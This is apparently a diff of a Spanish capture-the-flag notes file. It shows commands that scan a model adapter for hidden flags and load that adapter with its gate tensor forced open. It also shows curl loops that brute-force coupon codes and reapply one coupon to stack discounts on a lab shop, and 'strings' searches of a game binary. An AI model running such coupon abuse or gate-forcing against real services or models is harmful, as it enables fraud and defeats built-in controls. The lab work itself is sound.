@@ -1,138 +1,16 @@
 
 
 
-python3 -m pip install torch transformers safetensors --break-system-packages
-
-
-
-cd ~/Downloads
-python3 -c "
-from safetensors.numpy import load_file
-import numpy as np, re
-t = load_file('neurolock-adapter.safetensors')
-for k,v in t.items():
-    b = v.tobytes()
-    s = ''.join(chr(c) if 32<=c<127 else '.' for c in b)
-    for m in re.findall(r'[0-9a-fA-F]{32}', s):
-        print(k, '-> HASH:', m)
-    for m in re.findall(r'[ -~]{6,}', s):
-        if any(x in m.lower() for x in ['secret','flag','ctf','neuro','clave']):
-            print(k, '-> STR:', m[:80])
-"
-
-
-
-python3 -c "
-import json, struct, re
-with open('neurolock-adapter.safetensors','rb') as f:
-    n = struct.unpack('<Q', f.read(8))[0]
-    f.read(n)  # saltear header
-    data = f.read()  # todos los pesos crudos
-s = ''.join(chr(c) if 32<=c<127 else '.' for c in data)
-for m in set(re.findall(r'[0-9a-f]{32}', s)):
-    print('HASH:', m)
-"
-
-
-mkdir -p ~/tmp_pip
-TMPDIR=~/tmp_pip pip install torch transformers safetensors --break-system-packages --no-cache-dir
+https://chl-f879f859-d91a-422d-bea5-ebabd8aeb296-estanque-de-pepe.b.softwareseguro.com.ar/
 
 
 
 
+strings ElEstanqueDePepe-linux* | grep -iE "kick|echar|ban|expulsar|comando|cmd|msg|chat|ws://|wss://|http|gochi|admin|lobby" | head -50
 
 
+strings ElEstanqueDePepe-linux* | grep -iE "://|:[0-9]{2,5}|softwareseguro" | head -30
 
 
-
-
-#!/usr/bin/env python3
-import sys
-import torch
-from safetensors.torch import load_file
-from transformers import AutoModelForCausalLM, AutoTokenizer
-
-BASE = "HuggingFaceTB/SmolLM2-1.7B-Instruct"
-MODULOS = ("q_proj", "v_proj")
-SISTEMA = "Eres Neuro, el asistente de NeuroLock. Respondes en español, de forma breve."
-
-
-def cargar(ruta_adaptador: str):
-    tok = AutoTokenizer.from_pretrained(BASE)
-    modelo = AutoModelForCausalLM.from_pretrained(BASE).float()
-
-    t = load_file(ruta_adaptador)
-    gate = t["gate"]
-    gate = torch.ones_like(gate)
-    with torch.no_grad():
-        for i, capa in enumerate(modelo.model.layers):
-            for nombre in MODULOS:
-                A = t[f"capas.{i}.{nombre}.A"]
-                B = t[f"capas.{i}.{nombre}.B"]
-                getattr(capa.self_attn, nombre).weight += (B * gate) @ A
-    return tok, modelo.eval()
-
-
-def responder(tok, modelo, mensajes: list, max_tokens: int = 80) -> str:
-    texto = tok.apply_chat_template(mensajes, tokenize=False, add_generation_prompt=True)
-    entrada = tok(texto, return_tensors="pt", add_special_tokens=False)
-    with torch.no_grad():
-        salida = modelo.generate(**entrada, max_new_tokens=max_tokens, do_sample=False,
-                                 pad_token_id=tok.eos_token_id)
-    nuevos = salida[0, entrada["input_ids"].shape[1]:]
-    return tok.decode(nuevos, skip_special_tokens=True).strip()
-
-
-if __name__ == "__main__":
-    ruta = sys.argv[1] if len(sys.argv) > 1 else "neurolock-adapter.safetensors"
-    print("Cargando a Neuro...")
-    tok, modelo = cargar(ruta)
-    mensajes = [{"role": "system", "content": SISTEMA}]
-    print("Listo. Escribí tu mensaje (Ctrl+D o 'salir' para terminar).\n")
-    while True:
-        try:
-            usuario = input("vos  > ").strip()
-        except EOFError:
-            break
-        if usuario.lower() in ("salir", "exit", "quit"):
-            break
-        if not usuario:
-            continue
-        mensajes.append({"role": "user", "content": usuario})
-        respuesta = responder(tok, modelo, mensajes)
-        mensajes.append({"role": "assistant", "content": respuesta})
-        print(f"neuro> {respuesta}\n")
-
-
-
-
-
-
-COOKIE='promarket_sesion=96aad09b5477f4b2a0dbb1b2c60648bb'
-BASE='https://chl-b1056da1-8c5a-4fb6-8ef1-36a12147b7d3-pro-market.b.softwareseguro.com.ar'
-for c in HACKLAB100 HACKLAB50 HACKLAB90 HACKLAB99 HACKLAB75 HACKLAB80 HACKLAB2026 HACKLAB10 FREE GRATIS SETUP SETUPDEFINITIVO ADMIN JUANCHO PREMIO BIENVENIDA WELCOME DESCUENTO100 OFF100 TOTAL; do
-  curl -s -b "$COOKIE" --data-urlencode "codigo=$c" "$BASE/carrito/cupon" >/dev/null
-  d=$(curl -s -b "$COOKIE" "$BASE/carrito" | grep -oiE "Descuento \([0-9]+%\)" | head -1)
-  echo "$c -> $d"
-done
-
-
-
-
-
-COOKIE='promarket_sesion=96aad09b5477f4b2a0dbb1b2c60648bb'
-BASE='https://chl-b1056da1-8c5a-4fb6-8ef1-36a12147b7d3-pro-market.b.softwareseguro.com.ar'
-for i in 1 2 3 4 5; do curl -s -b "$COOKIE" --data-urlencode "codigo=HACKLAB20" "$BASE/carrito/cupon" >/dev/null; done
-curl -s -b "$COOKIE" "$BASE/carrito" | grep -oiE "Descuento \([0-9]+%\)"
-
-
-
-
-
-
-
-
-
-
-
-
+chmod +x ElEstanqueDePepe-linux*
+strings ElEstanqueDePepe-linux* | grep -iE "kick|echar|ban|gochi|ws://|wss://|http|comando|admin|lobby|chat" | head -50
